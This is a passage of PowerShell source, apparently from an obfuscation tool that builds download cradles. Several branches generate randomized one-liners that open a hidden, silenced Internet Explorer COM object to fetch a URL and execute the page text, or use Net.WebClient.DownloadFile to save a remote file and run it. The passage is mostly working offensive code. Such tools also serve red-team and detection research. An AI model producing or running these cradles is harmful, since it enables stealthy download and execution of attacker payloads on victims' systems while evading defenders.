                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        }
        13 {
            #################################################
            ## PSCOMIE - COM Object With Internet Explorer ##
            #################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = (Get-Random -Input @(3,4))}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comIE' # IE COM Object

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 1

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','Navigate','RuntimeInteropServicesMarshal','Visible','BooleanFalse','Silent','BooleanTrue','Sleep','Busy','Document','Body','InnerText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Navigate  =  $Navigate.Replace($VarTag1,$GetVar1)
                        $Visible   =   $Visible.Replace($VarTag1,$GetVar1)
                        $Silent    =    $Silent.Replace($VarTag1,$GetVar1)
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Document  =  $Document.Replace($VarTag1,$GetVar1)
                        $Body      =      $Body.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document)
                        $InnerText = $InnerText.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document).Replace($BodyTag,$Body)

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag InternetExplorer.Application"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible=$BooleanFalse"
                        $CommandArray += "$GetVar1.$Silent=$BooleanTrue"
                        $CommandArray += "$GetVar1.$Navigate('$Url')"

                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.

                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'comIE' # IE COM Object
                    $RandomVarName2 = 'result' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 1

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    # Fall back to default options for these values since they are in Property array.
                    $NavigateWithTags  = $NavigateWithTags.Replace($Navigate,$NavigateOptions[0])
                    $Navigate          = $NavigateOptions[0]
                    $VisibleWithTags   = $VisibleWithTags.Replace($Visible,$VisibleOptions[0])
                    $Visible           = $VisibleOptions[0]
                    $SilentWithTags    = $SilentWithTags.Replace($Silent,$SilentOptions[0])
                    $Silent            = $SilentOptions[0]

                    # Highlight $PropertyFlag if Rearrange is the option explicitly selected during this execution.
                    Switch($TokenNameUpdatedThisIteration)
                    {
                        'Rearrange' {$PropertyFlagWithTags = '<<<0' + $PropertyFlag + '0>>>'}
                        'Navigate'  {$NavigateWithTags     = '<<<0' + $Navigate     + '0>>>'}
                        'Visible'   {$VisibleWithTags      = '<<<0' + $Visible      + '0>>>'}
                        'Silent'    {$SilentWithTags       = '<<<0' + $Silent       + '0>>>'}
                    }

                    # Throw warning for certain obfsucation options that will not be applied to current syntax arrangement.
                    # For these options back down to default values as long as current syntax arrangement option is selected.
                    If(@('Navigate','Visible','Silent') -Contains $TokenNameUpdatedThisIteration)
                    {
                        Write-Host "`n"
                        Write-Host "WARNING:" -NoNewline -ForegroundColor Yellow
                        Write-Host " We are using" -NoNewLine
                        Write-Host " -Property" -NoNewline -ForegroundColor Cyan
                        Write-Host " in current syntax arrangement.`n         Therefore, all options for" -NoNewline
                        Write-Host " $TokenName" -NoNewline -ForegroundColor Cyan
                        Write-Host " will not be applied.`n         Doing so would require another COM object and more cleanup.`n"
                    }

                    # Highlight $PropertyFlag if Rearrange is the option explicitly selected during this execution.
                    If($TokenNameUpdatedThisIteration -eq 'Rearrange') {$PropertyFlagWithTags = '<<<0' + $PropertyFlag + '0>>>'}

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','Navigate','RuntimeInteropServicesMarshal','Visible','BooleanFalse','Silent','BooleanTrue','Sleep','PropertyFlag','Busy','Document','Body','InnerText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'

                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                              
                            $PropertyArray = $PropertyArrayWithTags
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Document  =  $Document.Replace($VarTag1,$GetVar1)
                        $Body      =      $Body.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document)
                        $InnerText = $InnerText.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document).Replace($BodyTag,$Body)

                        # Set random order of property values to be used in below -Property array.
                        $PropertyArray         =  @("$Navigate='$Url'","$Visible=$BooleanFalse","$Silent=$BooleanTrue")[$PropertyArrayIndex_012] -Join ';'
                        $PropertyArrayWithTags = $PropertyArray.Replace($Navigate,$NavigateWithTags).Replace($Visible,$VisibleWithTags).Replace($Silent,$SilentWithTags)

                        # Set command arrangement logic here.
                        $CommandArray   = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag InternetExplorer.Application $PropertyFlag @{$PropertyArray}"

                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # Since we need to set properties for GetVar1 we must make sure that this variable uses .Value syntax instead of -ValueOnly syntax.
                    Do
                    {
                        # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                        $VarsUsedInThisBlock  = @()
                        $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                    }
                    While(!$Script:GetVar1.EndsWith('.Value'))
                    
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','Navigate','RuntimeInteropServicesMarshal','Visible','BooleanFalse','Silent','BooleanTrue','Sleep','Busy','Document','Body','InnerText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Navigate  =  $Navigate.Replace($VarTag1,$GetVar1)
                        $Visible   =   $Visible.Replace($VarTag1,$GetVar1)
                        $Silent    =    $Silent.Replace($VarTag1,$GetVar1)
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Document  =  $Document.Replace($VarTag1,$GetVar1)
                        $Body      =      $Body.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document)
                        $InnerText = $InnerText.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document).Replace($BodyTag,$Body)

                        # Set command arrangement logic here.
                        $CommandArray   = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag InternetExplorer.Application)"

                        $CommandArray  += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible=$BooleanFalse"
                        $CommandArray  += "$GetVar1.$Silent=$BooleanTrue"
                        $CommandArray  += "$GetVar1.$Navigate('$Url')"
                          
                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray += "While($GetVar1.Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1`InternetExplorer.Application"
                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag $GetVar1)"
                        $CommandArray2 += "While($GetVar1.$Busy){$Sleep}$GetVar1.$Visible=$BooleanFalse"
                        $CommandArray2 += "$GetVar1.$Silent=$BooleanTrue"
                        $CommandArray2 += "$SetVar2'$Url'"
                        $CommandArray2 += "$GetVar1.$Navigate($GetVar2)"

                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray2 += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray2 += "$GetVar1.Quit()"
                        $CommandArray2 += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray -Join ';')}
                            2 {$Syntax = (($CommandArray2[$Array2IndexOrder_01234] + $CommandArray2[5,6,7,8,9]) -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                4 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
 
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    # Fall back to default options for these values since they are in Property array.
                    $NavigateWithTags  = $NavigateWithTags.Replace($Navigate,$NavigateOptions[0])
                    $Navigate          = $NavigateOptions[0]
                    $VisibleWithTags   = $VisibleWithTags.Replace($Visible,$VisibleOptions[0])
                    $Visible           = $VisibleOptions[0]
                    $SilentWithTags    = $SilentWithTags.Replace($Silent,$SilentOptions[0])
                    $Silent            = $SilentOptions[0]

                    # Highlight $PropertyFlag if Rearrange is the option explicitly selected during this execution.
                    Switch($TokenNameUpdatedThisIteration)
                    {
                        'Rearrange' {$PropertyFlagWithTags = '<<<0' + $PropertyFlag + '0>>>'}
                        'Navigate'  {$NavigateWithTags     = '<<<0' + $Navigate     + '0>>>'}
                        'Visible'   {$VisibleWithTags      = '<<<0' + $Visible      + '0>>>'}
                        'Silent'    {$SilentWithTags       = '<<<0' + $Silent       + '0>>>'}
                    }

                    # Throw warning for certain obfsucation options that will not be applied to current syntax arrangement.
                    # For these options back down to default values as long as current syntax arrangement option is selected.
                    If(@('Navigate','Visible','Silent') -Contains $TokenNameUpdatedThisIteration)
                    {
                        Write-Host "`n"
                        Write-Host "WARNING:" -NoNewline -ForegroundColor Yellow
                        Write-Host " We are using" -NoNewLine
                        Write-Host " -Property" -NoNewline -ForegroundColor Cyan
                        Write-Host " in current syntax arrangement.`n         Therefore, all options for" -NoNewline
                        Write-Host " $TokenName" -NoNewline -ForegroundColor Cyan
                        Write-Host " will not be applied.`n         Doing so would require another COM object and more cleanup.`n"
                    }

                    # Highlight $PropertyFlag if Rearrange is the option explicitly selected during this execution.
                    If($TokenNameUpdatedThisIteration -eq 'Rearrange') {$PropertyFlagWithTags = '<<<0' + $PropertyFlag + '0>>>'}

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','ComObjectFlag','Navigate','RuntimeInteropServicesMarshal','Visible','BooleanFalse','Silent','BooleanTrue','Sleep','PropertyFlag','Busy','Document','Body','InnerText')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'

                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            $PropertyArray = $PropertyArrayWithTags
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Busy      =      $Busy.Replace($VarTag1,$GetVar1)
                        $Document  =  $Document.Replace($VarTag1,$GetVar1)
                        $Body      =      $Body.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document)
                        $InnerText = $InnerText.Replace($VarTag1,$GetVar1).Replace($DocumentTag,$Document).Replace($BodyTag,$Body)

                        # Set random order of property values to be used in below -Property array.
                        $PropertyArray         =  @("$Navigate='$Url'","$Visible=$BooleanFalse","$Silent=$BooleanTrue")[$PropertyArrayIndex_012] -Join ';'
                        $PropertyArrayWithTags = $PropertyArray.Replace($Navigate,$NavigateWithTags).Replace($Visible,$VisibleWithTags).Replace($Silent,$SilentWithTags)

                        # Set command arrangement logic here.
                        $CommandArray   = @()

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$ComObjectFlag InternetExplorer.Application $PropertyFlag @{$PropertyArray})"

                        $SyntaxToInvoke = "$GetVar1.$Document.$Body.$InnerText"

                        $CommandArray += "While($GetVar1.$Busy){$Sleep}" + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CommandArray += "$GetVar1.Quit()"
                        $CommandArray += "$RuntimeInteropServicesMarshal::ReleaseComObject($GetVar1)"
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set command arrangement logic here.
                        $Syntax = ($CommandArray -Join ';')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        }
        20 {
            #############################################
            ## New-Object Net.WebClient - DownloadFile ##
            #############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadFile         = $DownloadFile.Replace(        $NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadFileWithTags = $DownloadFileWithTags.Replace($NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")

                    $DownloadFile         = $DownloadFile.Replace(        $NewObjectTag,$NewObject.Replace($ModuleAutoLoadTag,''))
                    $DownloadFileWithTags = $DownloadFileWithTags.Replace($NewObjectTag,$NewObjectWithTags.Replace($ModuleAutoLoadTag,''))

                    # Add .Invoke to the end of $DownloadFile and $DownloadFileWithTags if $DownloadFile ends with ')'.
                    If($DownloadFile.EndsWith(')'))
                    {
                        $DownloadFile = $DownloadFile + '.Invoke'
      
                        If($DownloadFileWithTags.EndsWith('0>>>')) {$DownloadFileWithTags = $DownloadFileWithTags.SubString(0,$DownloadFileWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                       {$DownloadFileWithTags = $DownloadFileWithTags + '.Invoke'}
                    }

                    # Handle embedded tagging.
                    If($JoinWithTags.StartsWith('<<<0') -AND $JoinWithTags.EndsWith('0>>>'))
                    {
                        $JoinWithTags = $JoinWithTags.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                    }

                    # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                    If($Path -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                    {
                        $Path                = $Path
                        $PathWithTags        = $PathWithTags

                        $PathQuoted          = $Path
                        $PathQuotedWithTags  = $PathWithTags

                        $PathSourced         = $Path
                        $PathSourcedWithTags = $PathWithTags
                    }
                    Else
                    {
                        # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                        $PathWithTags = $PathWithTags.Replace($Path,$Path.Trim("'"))
                        $Path         = $Path.Trim("'")

                        # Create separate variables for DownloadFile method with quotes added to $Path.
                        $PathQuotedWithTags = "'$PathWithTags'"
                        $PathQuoted         = "'$Path'"

                        # $Path must be sourced or have a full path when used with Dot-Source and Import-Module invocation syntaxes.
                        $PathSourcedWithTags = $PathWithTags
                        $PathSourced         = $Path
                        If($Path -NotMatch '^([A-Z]:|\\\\|.[/\\])')
                        {
                            # Since $Path is not currently sourced and does not have a full path then we will add syntax for the current directory since that's how the DownloadFile method interprets this.
                            # $SourceRandom is either ./ or .\ syntax.
                            $PathSourcedWithTags = $PathWithTags.Replace($Path,"$SourceRandom$Path")
                            $PathSourced         = "$SourceRandom$Path"
                        }
                    }

                    $CradleSyntax         = '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadFile('$Url',$PathQuoted)"
                    $CradleSyntaxWithTags = '(' + $NewObjectWithTags.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadFileWithTags('$UrlWithTags',$PathQuotedWithTags)"

                    # Add extra semicolon check since disk-based cradles only include reading the downloaded file if Invoke is present.
                    # Otherwise $SyntaxToInvoke will be blank and no additional semicolon is needed.
                    $Semicolon = ';'
                    If($Invoke -eq $InvokeTag)
                    {
                        $SyntaxToInvoke         = ''
                        $SyntaxToInvokeWithTags = ''
                        $Semicolon              = ''
                    }
                    ElseIf($Invoke.Contains($PathTag) -AND !($Invoke.Contains($InvokeTag)))
                    {
                        $SyntaxToInvoke         = $Invoke.Replace($PathTag,$PathSourced)
                        $SyntaxToInvokeWithTags = $InvokeWithTags.Replace($PathTag,$PathSourcedWithTags)
                        $Invoke                 = $InvokeTag
                        $InvokeWithTags         = $InvokeTag
                    }
                    Else
                    {
                        $SyntaxToInvoke         = $GetBytesRandom.Replace($PathTag,$Path)
                        $SyntaxToInvokeWithTags = $GetBytesRandom.Replace($PathTag,$PathWithTags)

                        # If $Path is a variable or PowerShell command then remove any quotes that may be encapsulating it (only for ::ReadAllBytes option).
                        If($Path -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $SyntaxToInvoke         = $SyntaxToInvoke.Replace("'$Path'",$Path)
                            $SyntaxToInvokeWithTags = $SyntaxToInvokeWithTags.Replace("'$PathWithTags'",$PathWithTags)
                        }
                    }

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $CradleSyntax + $Semicolon + $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $CradleSyntaxWithTags + $Semicolon + $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $CradleSyntax + $Semicolon + $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $CradleSyntaxWithTags + $Semicolon + $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }
                      
                    If($NewObject.Contains($ModuleAutoLoadTag))
                    {
                        $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                        If($NewObject.EndsWith('0>>>'))
                        {
                            $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                        }
                    }
                    Else
                    {
                        $CurrentModuleAutoLoadRandom = ''
                    }
                    $CradleSyntax         = $CurrentModuleAutoLoadRandom + $CradleSyntax
                    $CradleSyntaxWithTags = $CurrentModuleAutoLoadRandom + $CradleSyntaxWithTags
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'    # WebClient
                    $RandomVarName2 = 'url'   # Url
                    $RandomVarName3 = 'wc2'   # WebClient (Argument)
                    $RandomVarName4 = 'df'    # DownloadFile (Method)
                    $RandomVarName5 = 'dpath' # Path

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 5

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadFile         = $DownloadFile.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadFileWithTags = $DownloadFileWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,($GetVar4 + '.Invoke'))
                    $GetVar4         = $GetVar4 + '.Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Path','Command','CommandEscapedString','NewObject','DownloadFile')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadFile in single quotes if basic syntax is used.
                        If($DownloadFile.Contains('DownloadFile'))
                        {
                            $DownloadFileWithTags = $DownloadFileWithTags.Trim("'").Replace($DownloadFile,("'" + $DownloadFile + "'")).Replace("''","'")
                            $DownloadFile         = "'" + $DownloadFile.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        $PathValueForEvaluation = $Path
                        If($Path.StartsWith('<<<') -AND $Path.EndsWith('>>>'))
                        {
                            $PathValueForEvaluation = $Path.SubString(4,$Path.Length-4-4)
                        }
                        
                        # Do not deal with sourcing or quotes if $Path is actually PowerShell code (e.g., $Profile, (Get-Variable Profile).Value).
                        If($PathValueForEvaluation -Match '(^[(].*[)]$|^[(].*[)][.]Value|^[$])')
                        {
                            $Path        = $Path
                            $PathQuoted  = $Path
                            $PathSourced = $Path
                        }
                        Else
                        {
                            # Remove any quotes around path. They should only be added for DownloadFile and ::ReadAllBytes methods (and ::ReadAllBytes is already handled in syntax array at beginning of this script).
                            $Path = $Path.Trim("'")

